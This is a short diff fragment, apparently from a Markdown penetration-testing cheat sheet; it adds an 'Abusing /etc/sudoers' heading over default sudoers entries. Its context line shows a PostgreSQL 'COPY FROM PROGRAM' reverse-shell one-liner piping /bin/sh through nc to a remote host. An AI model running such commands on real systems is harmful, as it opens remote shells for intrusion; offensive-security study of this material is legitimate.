@@ -457,3 +457,12 @@ COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1
 ```
 check zip,gz,7z,stix,rar files
 ```
+
+###### Abusing /etc/sudoers
+```
+# Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# Allow members of group admin to execute any command
+%admin 	ALL=(ALL:ALL) ALL
+```
